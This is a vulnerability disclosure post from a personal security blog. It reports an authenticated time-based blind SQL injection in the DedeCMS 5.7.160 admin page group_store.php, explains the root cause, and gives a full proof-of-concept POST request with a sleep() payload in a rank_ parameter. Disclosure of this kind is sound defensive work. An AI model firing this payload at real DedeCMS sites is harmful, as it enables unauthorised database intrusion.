=== Content from srpopty.github.io_0af02c00_20250114_202949.html ===


[Shadow Gallery](/)

Live in the shadow

* [首页](/)
* [知识库](/knowledge/)
* [随想](/life/)
* [ctf](/ctf/)
* [漏洞](/vulnerabilities/)
* [标签](/tags/)
* [分类](/categories/)
* [归档](/archives/)
* [站点地图](/sitemap.xml)
* 搜索

0%

# DedeCMS V5.7.160 Backend Blind SQL Injection

发表于
2023-02-27

分类于
[Vulnerability](/categories/Vulnerability/)

DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/group\_store.php.

# Description

Admin backend group store blind SQL injection via post parameters.

# Affected Version

DedeCMS <= 5.7.160

![](/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/1.png)

# POC

1. Login to admin backend management.
2. Request to `/dede/group_store.php` with GET parameter `action=uprank` and POST parameters `rank_1=1'+and+sleep(3)+and+'1`, this payload will lead to a time-based SQL injection.
3. In the source code of `/dede/group_store.php`, when the GET parameter `action` is `uprank`, the POST value which the key contains `rank_` will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through `mysqli_query`, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.

![](/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/2.png)

Full POC request:

| ``` 12345678910111213 ``` | ``` POST /cms/dedecms/dede/group_store.php?action=uprank HTTP/1.1Host: 192.168.0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fgroup_store.phpConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 29rank_1=1'+and+sleep(3)+and+'1 ``` |
| --- | --- |

# Reference

> Reported by Srpopty, vulnerability discovered by using Corax.

[# Web](/tags/Web/)
[# CVE](/tags/CVE/)
[# SQLi](/tags/SQLi/)

[DedeCMS V5.7.160 Backend Blind SQL Injection](/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/ "DedeCMS V5.7.160 Backend Blind SQL Injection")
[Joomla V4.2.8 Backend Reflected-XSS](/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/ "Joomla V4.2.8 Backend Reflected-XSS")

* 文章目录
* 站点概览

1. [1. Description](#Description)
2. [2. Affected Version](#Affected-Version)
3. [3. POC](#POC)
4. [4. Reference](#Reference)

Srpopty

[47
日志](/archives/)

[9
分类](/categories/)

[18
标签](/tags/)

[GitHub](https://github.com/Srpopty "GitHub → https://github.com/Srpopty")

E-Mail

© 2016 –
2024

Srpopty


